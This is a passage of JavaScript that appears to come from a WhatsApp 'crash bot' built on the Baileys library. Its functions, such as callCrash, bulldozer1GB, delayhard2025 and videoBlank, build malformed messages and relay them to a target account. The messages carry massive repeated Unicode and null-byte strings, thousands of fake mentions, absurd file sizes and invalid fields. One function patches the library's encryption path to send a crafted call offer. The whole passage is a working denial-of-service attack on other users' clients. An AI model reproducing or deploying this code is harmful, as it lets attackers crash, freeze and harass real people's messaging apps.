                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    
    const YutaxMembuatReqJamz = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ោ៝".repeat(63000),
            hasMediaAttachment: false
          },
          body: {
            text: "ꦽ".repeat(1024)
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_call", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) }
            ],
            messageParamsJson: "{}"
          }
        }
      }
    }
  };
  
  await sock.relayMessage("status@broadcast", YutaxMembuatReqJamz.message, {
        messageId: YutaxMembuatReqJamz.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    
    const ReqJamzBlank = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        albumMessage: {
          expectedImageCount: 666,
          expectedVideoCount: 0,
          items: [
            { imageMessage: imageMsg }
          ],
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            stanzaId: "1234567890ABCDEF",
            forwardedNewsletterMessageInfo: {
              newsletterName: "...",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            },
            eventCoverImage: {
              eventId: Date.now() + 1814400000,
              eventName: "Kountol",
              eventDescription: "ꦽ".repeat(20000),
              startTime: 9999999999,
              endTime: 99999999999,
              eventCoverMedia: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                caption: "ោ៝".repeat(20000),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9UJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k="
              },
              eventLocation: {
                name: "Kontol",
                address: "ោ៝".repeat(20000),
                degreesLatitude: -922.99999999,
                degreesLongitude: 922.999999999999,
                url: "https://t.me/AlwaysYutax"
              },
              eventParticipants: {
                participants: [{ jid: target, displayName: "Participant" }]
              },
              eventStatus: "@MarkZugasu",
              eventOptions: {
                isAnonymous: true,
                canGuestsInvite: true,
                canSeeGuestList: true,
                maxParticipants: 9999999999,
                requiresApproval: false,
                customField1: "HI!",
                customField2: "HI!"
              },
              eventMetadata: JSON.stringify({
                heavy_data: "ACCOUNTS",
                nested: {
                  level1: "X".repeat(546),
                  level2: {
                    level3: "X".repeat(546),
                    level4: {
                      level5: "X".repeat(546),
                      array_data: Array(100).fill().map(() => ({
                        item: "Ahh",
                        details: "X"
                      }))
                    }
                  }
                }
              }),
              binaryData: "\u0081".repeat(0x7000)
            }
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage("status@broadcast", ReqJamzBlank.message, {
        messageId: ReqJamzBlank.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    console.log(`Succes Sending RFP-TARSAX To ${target}`);
}

async function glorymessage(target, cta = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
}

async function kresjandaotax(sock, target) {
  for (let i = 0; i < 10; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 10; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "ꦽ".repeat(10000),
          "body": "ꦽ".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { "screen": "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
        },
        "header": { 
          "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(50000),
          "hasMediaAttachment": false,
          "videoMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
            "mimetype": "video/mp4",
            "fileSha256": "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
            "fileLength": "9999999999999999",
            "seconds": 9999,
            "mediaKey": "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
            "height": 9999,
            "width": 9999,
            "fileEncSha256": "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
            "directPath": "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1755691703",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmycHh/9k=",
            "streamingSidecar": "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(50000)
            },
            "footer": {
              "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, carousel.message, {
      "messageId": carousel.key.id,
      participant: { jid: target }
    });
  }
}

async function videoBlank(sock, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Xatanicvxii",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function Gyxlores(target) {
    try {
        await sock.relayMessage(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32)
                        },
                        eventMessage: {
                            isCanceled: false,
                            name: "X",
                            description: "Dick Your Big",
                            location: {
                                degreesLatitude: "a",
                                degreesLongitude: "a",
                                name: "X"
                            },
                            joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                            startTime: "1714957200",
                            thumbnailDirectPath: "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzZodTIxai5qcGc=",
                            thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                            thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                            mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                            mediaKeyTimestamp: Date.now(),
                            contextInfo: {
                                mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                                remoteJid: "status@broadcast",
                                participant: "0@s.whatsapp.net",
                                fromMe: false,
                                isForwarded: true,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "1@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "X"
                                },
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "X",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: 'address_message',
                                            paramsJson: "\x10".repeat(1000000),
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            },
            {
                ephemeralExpiration: 5,
                timeStamp: Date.now()
            }
        );
        let etc = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "X",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                userJid: target,
                quoted: null
            }
        );

        await sock.relayMessage(target, etc.message, {
            participant: { jid: target }
        });
    } catch (err) {
        console.error("Error:", err);
    }
}

async function callCrash(sock, target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
  
  try {
    const devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    const cmute = () => {
      const locks = new Map();
      
      return {
        async mx(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mute = cmute();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mute.mx(jid, async () => {
            const { type, ciphertext } = await sock.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const ckey = crypto.randomBytes(32);
    const exckey = Buffer.concat([ckey, Buffer.alloc(8, 0x01)]);
    const cid = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await sock.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const stan = {
      tag: "call",
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": cid,
          "call-creator": sock.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          }
          (shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await sock.sendNode(stan);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function bulldozer1GB(target) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function delayhard2025(sock, target, mention) {
    console.log(chalk.red("⚙️ delayhard2025..."));

    const titid = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1945 }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
    ];

    const payload = "\u0000".repeat(27152);

    for (let i = 0; i < 10; i++) {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://files.catbox.moe/j5ogwy.png",
                        mimetype: "image/jpeg",
                        caption: "./xblaster",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: titid,
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: payload
                    }
                }
            }
        }, { userJid: target });
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await sock.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                fromMe: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "status@broadcast",
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "— \u9999" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        console.log(chalk.green(`[${i + 1}/10] ✅ delayhard2025 iteration done`));
    }

    console.log(chalk.yellow("✅ Finished delayhard2025!"));
}

async function SemestaOneHit(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    buttonsMessage: {
        contentText: "SEMESTA - JAYA",
        footerText: "\u0000",
        buttons: [
          {
            buttonId: "KenalZunGaBg?",
            buttonText: { 
              displayText: "\n".repeat(9000),
            },
            type: 1,
          },
        ],
        headerType: 1,
        contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\u0000".repeat(104500),
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            participant: target,
            remoteJid: "X",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          annotations: [
            {
              embeddedContent: {
                X,
              },
              embeddedAction: true,
            },
          ],
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
 const DelayIn = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "BULLDOZER - SEMESTA JAYA ▾" },
            footer: { text: "Buy pt? Pv" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };
    const payload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "ZunnFlow", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        },
      },
    },
  };

const msg2 = {
   interactiveResponseMessage: {
          body: {
            text: "maklo",
            format: "EXTENTION_1",
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: "\x10".repeat(5000),
            version: 4,
          },
          contextInfo: {
            participant: target,
            stanzaId: "status@broadcast",
            mentionedJid: ["181818181818@s.whatsapp.net"],
